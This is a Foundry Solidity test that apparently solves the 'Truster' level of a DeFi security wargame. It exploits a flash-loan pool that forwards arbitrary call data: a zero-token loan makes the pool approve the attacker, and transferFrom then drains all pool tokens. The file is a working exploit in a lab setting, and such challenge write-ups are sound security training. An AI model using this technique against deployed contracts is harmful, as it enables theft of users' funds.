// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../../src/truster/TrusterLevel.sol";
import "@openzeppelin/contracts//token/ERC20/IERC20.sol";

interface ITrusterPool {
  function flashLoan(
    uint256 amount,
    address borrower,
    address target,
    bytes calldata data) external returns (bool);
}

contract TrusterTest is Test {
  TrusterLevel internal level = new TrusterLevel();
  ITrusterPool internal pool;
  IERC20 internal token;
  uint256 internal TOKENS_IN_POOL;

  function setUp() public {
    level.setup();
    pool = ITrusterPool(address(level.pool()));
    token = IERC20(address(level.token()));
    TOKENS_IN_POOL = level.TOKENS_IN_POOL();
  }

  function testExploit() public {
    // tell the pool in the custom function to approve a transfer to us
    bytes memory data = abi.encodeWithSelector(IERC20.approve.selector, address(this), TOKENS_IN_POOL);

    // the pool doesn't control for a loan of 0 tokens, nor charges a fee.
    // hence, we don't need to prepare a callback to give it funds back.
    pool.flashLoan(
      0,
      address(this),
      address(token),
      data
    );

    // with our approval planted, we just take the funds
    token.transferFrom(address(pool), address(this), TOKENS_IN_POOL);

    level.validate();
  }
}
